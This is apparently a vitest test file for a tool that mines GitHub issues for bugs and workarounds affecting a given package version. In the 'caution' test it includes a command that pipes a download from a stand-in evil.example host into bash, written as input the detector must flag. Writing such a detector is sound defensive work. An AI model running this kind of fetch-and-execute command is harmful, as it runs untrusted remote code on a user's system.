import { describe, expect, it } from 'vitest';
import { issueSymbols, looksLikeCode, spanChains } from '../src/analyze/issueSymbols.js';
import { buildLandmines } from '../src/analyze/landmine.js';
import { splitFences } from '../src/analyze/markdown.js';
import { findMentions, versionEvidence } from '../src/analyze/version.js';
import { caution, excerpt, fixHint, offersWorkaround, pickWorkaround } from '../src/analyze/workaround.js';
import { GitHubClient } from '../src/github/client.js';
import { type RawIssue, searchVersionIssues } from '../src/github/issues.js';
import { replayHttp } from '../src/http.js';

const ctx = { name: 'zod', version: '3.22.4', repo: 'colinhacks/zod' };
const mention = (text: string): { kind: string; affected: boolean } | undefined => {
  const m = findMentions(text, ctx)[0];
  return m ? { kind: m.kind, affected: m.affected } : undefined;
};

function issue(partial: Partial<RawIssue>): RawIssue {
  return {
    repo: 'colinhacks/zod',
    number: 1,
    title: 'Something breaks',
    url: 'https://github.com/colinhacks/zod/issues/1',
    body: '',
    createdAt: '2026-01-01T00:00:00Z',
    updatedAt: '2026-01-02T00:00:00Z',
    author: 'reporter',
    association: 'NONE',
    labels: [],
    positiveReactions: 0,
    commentCount: 0,
    comments: [],
    ...partial,
  };
}

function comment(body: string, extra: Partial<RawIssue['comments'][number]> = {}): RawIssue['comments'][number] {
  return {
    id: `c${Math.random()}`,
    url: 'https://github.com/colinhacks/zod/issues/1#issuecomment-1',
    body,
    createdAt: '2026-01-03T00:00:00Z',
    author: 'stranger',
    association: 'NONE',
    minimized: false,
    positiveReactions: 0,
    ...extra,
  };
}

describe('version mentions: boundaries', () => {
  it.each([
    ['zod@3.22.4 breaks', true],
    ['^3.22.4', true],
    ['v3.22.4', true],
    ['on 3.22.4.', true],
    ['13.22.4', false],
    ['3.22.40', false],
    ['3.22.4.1', false],
    ['3.22.4-beta.1', false],
    ['x3.22.4', false],
  ])('%s → found=%s', (text, found) => {
    expect(findMentions(text, ctx).length > 0).toBe(found);
  });
});

describe('version mentions: kind', () => {
  it.each([
    ['zod@3.22.4', 'adjacent'],
    ['"zod": "3.22.4"', 'adjacent'],
    ['Zod v3.22.4', 'adjacent'],
    ['"zod": "^3.22.4"', 'range'],
    ['### What version of `zod` are you using?\n\n3.22.4', 'template'],
    ['| Zod version | 3.22.4 |', 'adjacent'],
    ['version: 3.22.4', 'template'],
    ['see https://zod.dev/v3.22.4/docs', 'url'],
    ['I see this on 3.22.4 too', 'plain'],
  ])('%j → %s', (text, kind) => {
    expect(mention(text)?.kind).toBe(kind);
  });

  it('a package name ending in the alias is not adjacency (eslint-config-next is not next)', () => {
    expect(findMentions('eslint-config-next: 14.2.3', { name: 'next', version: '14.2.3', repo: 'vercel/next.js' })[0]?.kind).not.toBe('adjacent');
  });
});

describe('version mentions: polarity', () => {
  it.each([
    ['It works fine in 3.22.4', false],
    ['worked with version 3.22.4', false],
    ['Downgrading to 3.22.4 fixes it', false],
    ['we rolled back to 3.22.4', false],
    ['last working version is 3.22.4', false],
    ['This was fixed in 3.22.4', false],
    ['We upgraded to 4.0.0 (from 3.22.4) and now it fails', false],
    ['I have a project with zod@3.22.4 that does not experience this', false],
    ['It does not work with 3.22.4', true],
    ['not fixed in 3.22.4', true],
    ["I can confirm @x's workaround works for us with 3.22.4", true],
    ['Still broken in 3.22.4', true],
    ['After updating to 3.22.4 (from 3.21.0) tests fail', true],
  ])('%j → affected=%s', (text, affected) => {
    expect(mention(text)?.affected).toBe(affected);
  });
});

describe('versionEvidence', () => {
  it('template in the body is strong', () => {
    const r = versionEvidence(issue({ body: '### Version\n\n3.22.4\n\n### Bug\n`z.string().email()` rejects plus signs' }), ctx);
    expect(r).toMatchObject({ evidence: { strength: 'strong', where: 'body', kind: 'template' } });
  });

  it('a confirming comment is medium; a bare package.json dump in a comment is weak', () => {
    expect(versionEvidence(issue({ comments: [comment('Still happening on 3.22.4')] }), ctx)).toMatchObject({
      evidence: { strength: 'medium', where: 'comment', by: 'stranger' },
    });
    expect(versionEvidence(issue({ comments: [comment('```json\n"zod": "^3.22.4"\n```')] }), ctx)).toMatchObject({ evidence: { strength: 'weak' } });
  });

  it('drops issues that only name the version as working, or not at all', () => {
    expect(versionEvidence(issue({ body: 'Works fine in 3.22.4, broken in 3.23.0' }), ctx)).toEqual({ dropped: 'unaffected' });
    expect(versionEvidence(issue({ body: 'nothing here' }), ctx)).toEqual({ dropped: 'unverified' });
    expect(versionEvidence(issue({ body: 'docs: https://zod.dev/v3.22.4/x' }), ctx)).toEqual({ dropped: 'incidental' });
    expect(versionEvidence(issue({ comments: [comment('On 3.22.4 too', { minimized: true })] }), ctx)).toEqual({ dropped: 'incidental' });
  });

  it('labels such as cant-reproduce lower the strength', () => {
    const r = versionEvidence(issue({ body: 'zod@3.22.4', labels: ['bug/cant-reproduce'] }), ctx);
    expect(r).toMatchObject({ evidence: { strength: 'medium', notes: ['labelled bug/cant-reproduce'] } });
  });

  it('monorepo packages need the issue to name the package', () => {
    const rq = { name: '@tanstack/react-query', version: '5.59.0', repo: 'TanStack/query', repoDirectory: 'packages/react-query' };
    expect(versionEvidence(issue({ title: '[vue-query] broken', body: 'version: 5.59.0' }), rq)).toMatchObject({ evidence: { strength: 'medium' } });
    expect(versionEvidence(issue({ title: 'react-query refetch', body: 'version: 5.59.0' }), rq)).toMatchObject({ evidence: { strength: 'strong' } });
  });

  it('common versions like 1.0.0 need more than a plain mention', () => {
    const r = versionEvidence(issue({ body: 'I am on 1.0.0' }), { ...ctx, version: '1.0.0' });
    expect(r).toMatchObject({ evidence: { strength: 'weak' } });
  });
});

describe('issue symbols', () => {
  const sym = (title: string, body: string): Record<string, number> =>
    Object.fromEntries(
      issueSymbols({ title, body }, { packageName: 'drizzle-orm', packageAliases: ['drizzle-orm'], importNames: ['drizzle-orm'], lang: 'js' }).map((s) => [s.name, s.score]),
    );

  it('title code, body spans, and member chains', () => {
    const s = sym('db.$count inside "extras" breaks', 'Using `db.$count(...)` in `extras`');
    expect(s.$count).toBe(1);
    expect(s['db.$count']).toBe(1);
  });

  it('error-message spans do not turn English words into symbols', () => {
    const s = sym('RangeError on insert', 'I get `MAX_PARAMETERS_EXCEEDED: Max number of parameters (65534) exceeded`');
    expect(s.exceeded).toBeUndefined();
    expect(s.parameters).toBeUndefined();
    expect(s.MAX_PARAMETERS_EXCEEDED).toBe(0.7);
  });

  it('file names, URLs and kebab-case package names are not symbols', () => {
    const s = sym('migration reads localhost-key.pem', 'see `drizzle.config.ts`, `drizzle-orm`, `https://x.io/a`, `localhost:3000`');
    expect(Object.keys(s)).toEqual([]);
  });

  it('code fences: imports and members used on this package', () => {
    const body = "```ts\nimport { drizzle } from 'drizzle-orm/node-postgres';\nconst db = drizzle(url);\nawait db.$client.end();\n```";
    const s = sym('client has no end', body);
    expect(s.$client).toBe(0.5);
    expect(s['$client.end']).toBe(0.5);
    expect(s.drizzle).toBeGreaterThan(0);
    expect(s['drizzle-orm/node-postgres']).toBeGreaterThan(0);
  });

  it('generic names score low alone', () => {
    expect(sym('`end` is missing', '').end).toBe(0.35);
  });

  it('task-list template lines are ignored', () => {
    expect(sym('x', '- [ ] `mysql`\n- [x] `postgres`').postgres).toBeUndefined();
  });

  it('helpers', () => {
    expect(looksLikeCode('Cannot read properties of undefined')).toBe(false);
    expect(looksLikeCode('z.string().email()')).toBe(true);
    expect(spanChains('call useQuery(opts) twice')).toEqual([['useQuery']]);
    expect(splitFences('a\n```ts\ncode\n```\nb').fences).toEqual([{ info: 'ts', code: 'code\n' }]);
  });
});

describe('workarounds', () => {
  it('offers vs asks', () => {
    expect(offersWorkaround('Our workaround is to pin the version.')).toBe(true);
    expect(offersWorkaround('Any workarounds so far?')).toBe(false);
    expect(offersWorkaround('Is there a workaround for this')).toBe(false);
  });

  it('prefers an explicit workaround with code and reactions; ignores +1s, bots and boilerplate', () => {
    const i = issue({
      comments: [
        comment('+1', { positiveReactions: 50 }),
        comment('Any update?'),
        comment('As a workaround you can wrap it:\n```ts\nz.string().regex(/x/)\n```', { author: 'helper', positiveReactions: 4 }),
        comment('Thanks for the report! We will triage soon.', { author: 'renovate[bot]' }),
      ],
    });
    const w = pickWorkaround(i, 'zod');
    expect(w).toMatchObject({ kind: 'workaround', author: 'helper', reactions: 4 });
    expect(w?.excerpt).toContain('z.string().regex');
  });

  it('a credited commenter wins', () => {
    const i = issue({
      comments: [
        comment('You can use a refine instead of email:\n```ts\nz.string().refine(isEmail)\n```', { author: 'alice' }),
        comment('You can also try passing options:\n```ts\nz.string().email({})\n```', { author: 'bob' }),
        comment("I can confirm @alice's workaround works for us"),
      ],
    });
    expect(pickWorkaround(i, 'zod')?.author).toBe('alice');
  });

  it('code + upvotes without a claim becomes a top reply; nothing qualifying returns undefined', () => {
    const top = pickWorkaround(issue({ comments: [comment('The bug is here:\n```ts\nfoo()\n```', { positiveReactions: 5 })] }), 'zod');
    expect(top?.kind).toBe('top-reply');
    expect(pickWorkaround(issue({ comments: [comment('same here')] }), 'zod')).toBeUndefined();
  });

  it('the issue body counts only when the reporter offers a workaround', () => {
    expect(pickWorkaround(issue({ body: 'You can use foo instead of bar' }), 'zod')).toBeUndefined();
    expect(pickWorkaround(issue({ body: 'Repro...\n\nWorkaround: call `z.coerce` first\n```ts\nz.coerce.string()\n```' }), 'zod')?.excerpt).toMatch(/^Workaround/);
  });

  it('caution flags shell pipes, other packages and unknown hosts', () => {
    expect(caution('curl -sL https://evil.example/x.sh | bash', 'zod')).toMatch(/pipes a download into a shell/);
    expect(caution('npm i zod-patched', 'zod')).toMatch(/installs another package \(zod-patched\)/);
    expect(caution('npm i zod@3.22.3', 'zod')).toBeUndefined();
    expect(caution('see https://github.com/a/b', 'zod')).toBeUndefined();
    expect(caution('see https://pastebin.com/x', 'zod')).toMatch(/links to pastebin\.com/);
  });

  it('excerpt strips HTML comments and quoted replies, and keeps a whole fence when it fits', () => {
    const e = excerpt(`> quoted\n<!-- hidden -->\nDo this:\n\`\`\`ts\n${'x();\n'.repeat(150)}\`\`\`\nmore`, 700);
    expect(e).not.toContain('quoted');
    expect(e).not.toContain('hidden');
    expect(e.split('```').length).toBe(3);
  });

  it('fix hints from maintainers or labels', () => {
    expect(fixHint(issue({ comments: [comment('This was fixed in v3.22.5, please upgrade.', { association: 'MEMBER', author: 'maint' })] }))).toMatchObject({
      author: 'maint',
      text: 'This was fixed in v3.22.5',
    });
    expect(fixHint(issue({ labels: ['bug/fixed-in-beta'] }))?.text).toBe('labelled "bug/fixed-in-beta"');
    expect(fixHint(issue({ comments: [comment('fixed in 3.22.5', { association: 'NONE' })] }))).toBeUndefined();
  });
});

describe('real corpus (recorded GitHub data)', () => {
  const gh = new GitHubClient({ http: replayHttp(new URL('./fixtures/http/corpus/', import.meta.url).pathname), token: 't' });

  it('drizzle-orm 0.36.0: #3402 points at $client, quotes the @ts-expect-error workaround, notes cant-reproduce', async () => {
    const { issues } = await searchVersionIssues(gh, 'drizzle-team/drizzle-orm', '0.36.0', 50);
    const r = buildLandmines(issues, { ecosystem: 'npm', name: 'drizzle-orm', version: '0.36.0', repo: 'drizzle-team/drizzle-orm' });
    expect(r.landmines).toHaveLength(15); // #3547 answers the drizzle-kit version field, not drizzle-orm
    const l = r.landmines.find((x) => x.issue.number === 3402);
    expect(l?.evidence).toMatchObject({ strength: 'medium', kind: 'template', notes: ['labelled bug/cant-reproduce'] });
    expect(l?.symbols.find((s) => s.name === '$client')?.score).toBeGreaterThanOrEqual(0.6);
    expect(l?.workaround).toMatchObject({ author: 'cluah', kind: 'workaround' });
    expect(l?.workaround?.excerpt).toContain('@ts-expect-error');
    // the ubiquitous entry point is penalised
    expect(Math.max(...r.landmines.flatMap((x) => x.symbols.filter((s) => s.name === 'drizzle').map((s) => s.score)))).toBeLessThan(0.6);
    expect(r.landmines.find((x) => x.issue.number === 3493)?.fixHint?.text).toMatch(/fixed-in-beta/);
  });

  it('pydantic 2.9.2: template evidence, precise API symbols, upgrade-from mentions dropped', async () => {
    const { issues } = await searchVersionIssues(gh, 'pydantic/pydantic', '2.9.2', 50);
    const r = buildLandmines(issues, { ecosystem: 'pypi', name: 'pydantic', version: '2.9.2', repo: 'pydantic/pydantic', importNames: ['pydantic'] });
    const top = (n: number): string | undefined => r.landmines.find((x) => x.issue.number === n)?.symbols[0]?.name;
    expect(top(10640)).toMatch(/^model_validate/);
    expect(top(11041)).toBe('validate_call');
    expect(r.landmines.find((x) => x.issue.number === 11119)).toBeUndefined(); // "upgraded from 2.9.2 to 2.11.7"
    expect(r.dropped.unaffected).toBeGreaterThanOrEqual(1);
    expect(r.landmines.find((x) => x.issue.number === 10891)?.workaround?.author).toBe('markext');
  });

  it('next 14.2.3: one unverifiable search hit is dropped', async () => {
    const { issues } = await searchVersionIssues(gh, 'vercel/next.js', '14.2.3', 50);
    const r = buildLandmines(issues, { ecosystem: 'npm', name: 'next', version: '14.2.3', repo: 'vercel/next.js', repoDirectory: 'packages/next' });
    expect(r.dropped.unverified).toBe(1);
    expect(r.landmines.find((x) => x.issue.number === 25456)?.symbols.map((s) => s.name)).toContain('next/dynamic');
  });
});

describe('mentions attributed to another product', () => {
  it('template fields for other packages, OSes and runtimes are not evidence', () => {
    const drizzle = { name: 'drizzle-orm', version: '0.36.0', repo: 'drizzle-team/drizzle-orm' };
    expect(versionEvidence(issue({ body: '### What version of `drizzle-kit` are you using?\n\n0.36.0' }), drizzle)).toEqual({ dropped: 'incidental' });
    expect(versionEvidence(issue({ body: '### What version of `drizzle-orm` are you using?\n\n0.36.0' }), drizzle)).toMatchObject({ evidence: { strength: 'strong' } });
    const next = { name: 'next', version: '14.2.1', repo: 'vercel/next.js' };
    expect(versionEvidence(issue({ body: 'OS version: 14.2.1' }), next)).toEqual({ dropped: 'incidental' });
    expect(versionEvidence(issue({ body: 'Running on macOS 14.2.1' }), next)).toEqual({ dropped: 'incidental' });
  });
});

describe('backticked versions in a label are not other products', () => {
  it('upgrading from `2.x` to the latest version `3.6.0` is about 3.6.0', () => {
    const r = versionEvidence(
      issue({ comments: [comment('I see this after upgrading `date-fns` from version `2.x` to the latest version `3.6.0`. Did some investigation')] }),
      { name: 'date-fns', version: '3.6.0', repo: 'date-fns/date-fns' },
    );
    expect(r).toMatchObject({ evidence: { where: 'comment' } });
  });
});

describe('held-out sample A failure patterns (docs/ACCURACY.md)', () => {
  const v = (text: string, name: string, version: string) => findMentions(text, { name, version, repo: `o/${name}` })[0];

  it('a different package named right before the version is not evidence', () => {
    expect(v('"@types/jsonwebtoken": "^9.0.2",', 'jsonwebtoken', '9.0.2')?.other).toBe(true);
    expect(v('amqp==5.4.0', 'celery', '5.4.0')?.other).toBe(true);
    expect(v('matplotlib: 2.2.3', 'pandas', '2.2.3')?.other).toBe(true);
    expect(v('Compiling rayon v1.11.0', 'polars', '1.11.0')?.other).toBe(true);
    expect(v('celery==5.4.0', 'celery', '5.4.0')?.other).toBe(false);
    expect(v('- Day.js Version: 1.11.13', 'dayjs', '1.11.13')?.other).toBe(false);
    expect(v('Experiencing the same issue in python 3.12.8 and celery 5.4.0', 'celery', '5.4.0')?.other).toBe(false);
    expect(v('I am on 2.2.3', 'pandas', '2.2.3')?.other).toBe(false);
  });

  it('"passes on X", "X ... works just fine", "can\'t reproduce on X" mean X is not affected', () => {
    expect(v('passes on 8.3.3, failing on 8.3.4 and main', 'pytest', '8.3.3')?.affected).toBe(false);
    expect(v('Using Pandas 2.2.3, the snippet provided works just fine. This issue seems to be fixed already.', 'pandas', '2.2.3')?.affected).toBe(false);
    expect(v("On 2.2.3 I can't reproduce this", 'pandas', '2.2.3')?.affected).toBe(false);
    expect(v('On 2.2.3 it is still not fixed', 'pandas', '2.2.3')?.affected).toBe(true);
  });

  it('a version inside a long list of versions is incidental', () => {
    expect(v('(from versions: 1.22.0, 1.22.1, 1.22.2, 2.1.1, 2.1.2, 2.1.3, 2.2.0)', 'numpy', '2.1.2')?.other).toBe(true);
  });

  it('feature requests, docs and install issues are not bugs', async () => {
    const { isNonBug } = await import('../src/analyze/landmine.js');
    expect(isNonBug('ENH: Add Float128 support for groupby.', ['Enhancement', 'Groupby'])).toBe(true);
    expect(isNonBug('BLD: Error installing Numpy', ['32 - Installation'])).toBe(true);
    expect(isNonBug('Enhancement: more complete magicksave support', ['enhancement'])).toBe(true);
    expect(isNonBug('BUG: Boolean Column Indexing Issue', ['Bug', 'Indexing', 'Needs Discussion'])).toBe(false);
    expect(isNonBug('findOne returns null', [])).toBe(false);
  });

  it('a span named as the working alternative barely counts', () => {
    const s = issueSymbols(
      { title: 'numpy 2 ptp returns nan when applied to masked arrays', body: 'The issue is not a problem b/c one can still use `np.ma.ptp`.' },
      { packageName: 'numpy', packageAliases: ['numpy', 'np'], importNames: ['numpy'], lang: 'py' },
    );
    expect(s.find((x) => x.name === 'ma.ptp')?.score).toBeLessThan(0.6);
  });
});
